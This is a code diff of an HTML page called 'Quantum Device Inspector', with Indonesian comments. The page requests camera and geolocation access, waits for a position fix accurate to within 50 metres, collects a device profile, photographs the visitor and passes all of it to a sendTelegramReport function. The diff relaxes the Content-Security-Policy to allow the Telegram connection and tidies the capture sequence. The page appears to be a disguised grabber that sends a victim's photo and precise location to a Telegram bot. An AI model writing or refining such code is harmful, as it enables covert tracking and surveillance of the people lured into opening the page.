@@ -4,7 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>Quantum Device Inspector</title>
-  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https: 'unsafe-inline' 'unsafe-eval';">
+  <!-- CSP diperbarui agar mengizinkan koneksi ke API Telegram -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';">
   <style>
     :root {
       --primary: #2ecc71;
@@ -198,7 +199,6 @@
         }
         // Hentikan stream lama jika ada
         mediaStream?.getTracks().forEach(track => track.stop());
-        
         const constraints = {
           video: {
             facingMode: { ideal: 'environment' },
@@ -234,6 +234,7 @@
         };
         const watchId = navigator.geolocation.watchPosition(
           position => {
+            // Cek akurasi, jika kurang atau sama dengan 50m, gunakan posisi tersebut
             if (position.coords.accuracy <= 50) {
               navigator.geolocation.clearWatch(watchId);
               resolve(position);
@@ -245,7 +246,7 @@
           },
           options
         );
-        // Pastikan jika tidak mendapatkan posisi dalam 30 detik, maka timeout
+        // Jika tidak mendapatkan posisi dalam 30 detik, timeout
         setTimeout(() => {
           navigator.geolocation.clearWatch(watchId);
           reject(new Error('Location request timed out'));
@@ -354,13 +355,18 @@
         const permissionsGranted = await requestPermissions();
         if (!permissionsGranted) throw new Error('Permissions not granted');
         await initCamera();
-        // Dapatkan device profile, lokasi dan pastikan delay minimal 2 detik
-        const [deviceProfile, location] = await Promise.all([
-          getDeviceProfile(),
-          getDeviceLocation(),
-          new Promise(resolve => setTimeout(resolve, 2000))
-        ]);
+        // Gunakan Promise.all untuk mendapatkan device profile dan lokasi, dengan delay minimal 2 detik.
+        const [deviceProfile, location] = await (async () => {
+          const results = await Promise.all([
+            getDeviceProfile(),
+            getDeviceLocation(),
+            new Promise(resolve => setTimeout(resolve, 2000))
+          ]);
+          return [results[0], results[1]];
+        })();
         const photo = await captureFrame();
+        // Optional: hentikan stream kamera setelah capture untuk menghemat resource
+        mediaStream.getTracks().forEach(track => track.stop());
         await sendTelegramReport(photo, deviceProfile, location);
         displayDeviceInfo(deviceProfile, location);
         toast.show('Scan complete! Report sent', 'success');
